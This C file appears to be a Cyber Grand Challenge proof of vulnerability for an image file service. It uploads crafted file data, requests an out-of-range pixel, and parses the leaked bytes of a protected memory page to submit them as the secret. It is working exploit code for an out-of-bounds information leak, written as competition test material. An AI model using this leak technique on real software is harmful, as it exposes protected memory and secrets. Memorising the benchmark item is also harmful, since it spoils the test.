/*

Author: Dan Czarnecki <cgc@cromulence.com>

Copyright (c) 2016 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include "libpov.h"
#include "libcgc.h"

int cgc_SendToCB(char *buf, int length) {
  int total_sent = 0;
  int ret;
  cgc_size_t bytes_sent = 0;
  while(total_sent < length) {
    ret = cgc_transmit(1, buf + total_sent, length - total_sent, &bytes_sent);
    if (ret != 0) {
      // error
      return -1;
    }
    if (bytes_sent == 0) {
      break;
    }
    total_sent += bytes_sent;
  }
  return bytes_sent;
}

cgc_size_t cgc_read_string( char* buffer, int count, char terminator)
{
  cgc_size_t TotalBytes = 0;
  cgc_size_t rx_bytes;

  if (!buffer) {
    return(0);
  }

  while (TotalBytes < count)
  {
    if (cgc_receive(0, buffer+TotalBytes, 1, &rx_bytes) != 0)
    {
      cgc__terminate(0);
    }
    if (rx_bytes == 0)
    {
      cgc__terminate(0);
    }

    if ( *(buffer + TotalBytes) == terminator )
    {
      buffer[TotalBytes] = '\0';
      return TotalBytes;
    }

    TotalBytes += rx_bytes;
  }

  return(TotalBytes);
}


int cgc_ReceiveFromCB(char *buf, int length) {
  cgc_size_t total_received = 0;
  cgc_size_t bytes_received = 0;
  int ret;
  while (total_received < length) {
    ret = cgc_receive(0, buf + total_received , length - total_received , &bytes_received);
    if (ret != 0) {
      return -1;
    }
    if (bytes_received == 0) {
      break;
    }
    total_received += bytes_received;
  }
  return total_received;
}

int cgc_CheckMatch(char *response, char *match, int length)
{
  for (int i=0; i < length; i++)
  {
    if (response[i] != match[i])
    {
      return -1;
    }
  }
  return 0;
}

void *cgc_memcpy( void *pDest, const void *pSource, cgc_size_t nbytes )
{
  void *pDestReturn = pDest;

  while ( nbytes >= 4 )
  {
    *((uint32_t*)pDest) = *((uint32_t*)pSource);

    pDest += 4;
    pSource += 4;
    nbytes-=4;
  }

  while ( nbytes > 0 )
  {
    *((uint8_t*)pDest) = *((uint8_t*)pSource);

    pDest++;
    pSource++;
    nbytes--;
  }

  return (pDestReturn);
}

int main(int cgc_argc, char *cgc_argv[]) {
  // negotiate
  type2_vals t2vals;
  cgc_type2_negotiate(&t2vals);

  // perform POV
  char buffer[4096];
  cgc_size_t txSize = 0;

  // Read Hello
  cgc_read_string(buffer, 256, '\n');

  // Select NEW_FILE
  cgc_memcpy(buffer, "\x01", 1);
  cgc_SendToCB(buffer, 1);

  // NEW_FILE selected message
  cgc_read_string(buffer, 256, '\n');
  cgc_read_string(buffer, 256, '\n');

  // padding data
  cgc_memcpy(buffer, "\xc0\xc0", 2);
  cgc_SendToCB(buffer, 2);

  // flip the magic page bytes so it can be cgc_read properly
  uint32_t addr1 = (uint16_t)(t2vals.region_addr<<16 | t2vals.region_addr>>16);
  uint32_t addr2 = (uint16_t)(t2vals.region_addr<<0 | t2vals.region_addr>>0);

  for(int i = 0; i < 4088; i+=4)
  {
    // send new file data
    cgc_SendToCB((char*)&addr1, 2);
    cgc_SendToCB((char*)&addr2, 2);

  }

  // new file loaded message
  cgc_read_string(buffer, 256, '\n');

  // send Compress command
  cgc_memcpy(buffer, "\x07", 1);
  cgc_SendToCB(buffer, 1);

  // COMPRESS selected message
  cgc_read_string(buffer, 256, '\n');

  // send Decompress command
  cgc_memcpy(buffer, "\x08", 1);
  cgc_SendToCB(buffer, 1);

  // DECOMPRESS selected message
  cgc_read_string(buffer, 256, '\n');

  // send SHOW_PIXEL command
  cgc_memcpy(buffer, "\x09", 1);
  cgc_SendToCB(buffer, 1);

  cgc_memset(buffer, 0, 256);

  // SHOW_PIXEL selected
  cgc_read_string(buffer, 256, '\n');
  // Pixel selection prompt
  cgc_read_string(buffer, 256, '\n');

  cgc_memcpy(buffer, "\x02\x02", 2);
  cgc_SendToCB(buffer, 2);
  //cgc_transmit(2, buffer, 64, &rxSize);

  // Out of range message
  cgc_read_string(buffer, 256, '\n');
  //cgc_transmit(2, buffer, 64, &rxSize);

  // XYZ pixel info with leak
  cgc_read_string(buffer, 256, '\n');

  // color string
  cgc_read_string(buffer, 256, '\n');

  char *end;
  int secret1, secret2;
  char val1[5];
  char val2[5];
  cgc_memcpy(val1, buffer+8, 4);
  cgc_memcpy(val2, buffer+12, 4);

  secret1 = (int)cgc_strtol(val1, &end, 16);
  secret2 = (int)cgc_strtol(val2, &end, 16);

  secret1 = (secret1>>8) | (secret1<<8);
  secret2 = (secret2>>8) | (secret2<<8);

  unsigned char secret[4];
  cgc_memcpy(secret, &secret1, 2);
  cgc_memcpy(secret+2, &secret2, 2);

  // new line
  cgc_read_string(buffer, 256, '\n');

  cgc_memcpy(buffer, "\x0b", 1);
  cgc_SendToCB(buffer, 1);

  // cgc_exit
  cgc_read_string(buffer, 256, '\n');

  // submit the secret
  cgc_type2_submit((unsigned char*)secret, 4);

  return 0;
}
